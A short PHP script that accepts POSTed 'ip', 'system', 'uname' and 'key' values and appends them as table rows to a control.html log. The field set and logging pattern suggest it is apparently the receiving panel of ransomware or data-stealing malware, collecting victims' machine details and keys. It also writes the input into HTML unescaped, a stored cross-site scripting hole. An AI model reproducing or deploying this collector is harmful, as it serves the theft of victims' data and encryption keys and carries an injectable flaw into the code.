<!DOCTYPE HTML>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
	<title></title>
</head>
<body>
<?php

if ($_POST){
	$ip     = $_POST["ip"];
	$system = $_POST["system"];
	$uname  = $_POST["uname"];
	$key    = $_POST["key"];

	$dosya=fopen("control.html","a");
	$satir = '<tr><td>'.$system."</td><td>".$uname."</td><td>".$ip."</td><td>".$key."</td></tr>";

	@$kontrol=fwrite($dosya,$satir);
}
?>	
</body>
</html>
